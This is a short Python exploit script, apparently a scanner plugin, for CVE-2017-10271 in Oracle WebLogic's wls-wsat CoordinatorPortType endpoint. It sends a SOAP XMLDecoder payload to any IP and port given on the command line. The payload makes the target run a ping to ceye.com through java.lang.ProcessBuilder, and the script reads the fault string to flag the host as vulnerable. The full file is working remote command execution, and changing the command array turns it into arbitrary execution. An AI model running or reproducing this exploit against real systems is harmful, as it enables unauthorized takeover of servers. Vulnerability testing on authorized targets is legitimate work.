import sys
import requests
import re
from config.config_requests import ua

VUL=['CVE-2017-10271']
headers = {
    "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
    "User-Agent":ua,
    "Content-Type":"text/xml"
}
def poc(u):
    url = "http://" + u
    url += '/wls-wsat/CoordinatorPortType'
    post_str = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <void class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="2">
                <void index="0">
                  <string>/usr/sbin/ping</string>
                </void>
                <void index="1">
                  <string>ceye.com</string>
                </void>
              </array>
              <void method="start"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''

    try:
        response = requests.post(url, data=post_str, verify=False, timeout=5, headers=headers)
        response = response.text
        response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
    except Exception:
        response = ""

    if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
        return VUL[0]
    else:
        return None

def run(rip,rport=7001):
    url=rip+':'+str(rport)
    return poc(url)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print('Usage: {} <ip> [port]'.format(sys.argv[0]))
        sys.exit()
    print(run(sys.argv[1],sys.argv[2]) if len(sys.argv)==3 else run(sys.argv[1]))